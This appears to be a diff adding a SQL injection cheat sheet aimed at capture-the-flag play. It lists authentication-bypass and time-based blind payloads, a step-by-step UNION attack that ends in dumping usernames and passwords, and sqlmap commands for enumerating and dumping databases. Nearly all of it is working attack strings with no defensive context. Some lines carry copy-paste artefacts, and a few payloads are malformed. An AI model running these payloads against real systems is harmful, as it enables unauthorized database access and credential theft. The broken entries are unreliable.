@@ -1,0 +1,76 @@
+SQL INJECTION
+1. DB Fingerprinting
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+
+# MySQL
+' AND SLEEP(0)--
+' AND version()--
+SELECT @@version
+
+# PostgreSQL  
+' AND pg_sleep(0)--
+SELECT version()
+
+# MSSQL
+' AND 1=CONVERT(int,@@version)--
+SELECT @@version
+
+# Oracle
+' AND 1=1 FROM dual--
+SELECT banner FROM v$version
+2. Time-Based Blind SQLi
+bash# MySQL
+' AND SLEEP(5)--
+' OR SLEEP(5)#
+1'; WAITFOR DELAY '0:0:5'--   # MSSQL
+' AND pg_sleep(5)--            # PostgreSQL
+' AND 1=1 AND SLEEP(5)--
+
+# Extract DB name char by char (MySQL)
+' AND SLEEP(5) AND (SELECT SUBSTRING(database(),1,1))='a'--
+' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
+3. Union-Based SQLi
+bash# Step 1: Find column count
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--   # keep going till error
+
+# Step 2: Find printable columns
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+# Step 3: Fingerprint DB
+' UNION SELECT @@version,NULL--           # MySQL/MSSQL
+' UNION SELECT version(),NULL--           # PostgreSQL
+' UNION SELECT banner,NULL FROM v$version-- # Oracle
+
+# Step 4: Dump DB names (MySQL)
+' UNION SELECT group_concat(schema_name),NULL FROM information_schema.schemata--
+
+# Step 5: Dump tables
+' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
+
+# Step 6: Dump columns
+' UNION SELECT group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
+
+# Step 7: Dump data
+' UNION SELECT group_concat(username,0x3a,password),NULL FROM users--
+4. SQLMap (fastest for CTF)
+bashsqlmap -u "http://target.com/page?id=1" --dbs
+sqlmap -u "http://target.com/page?id=1" -D dbname --tables
+sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
+sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
+sqlmap -u "http://target.com/page?id=1" --technique=T --time-sec=5  # time-based only
+
+# POST request
+sqlmap -u "http://target.com/login" --data="user=admin&pass=test" -p user
+
+# With cookies
+sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"
+
+# From burp request file
+sqlmap -r request.txt --dbs
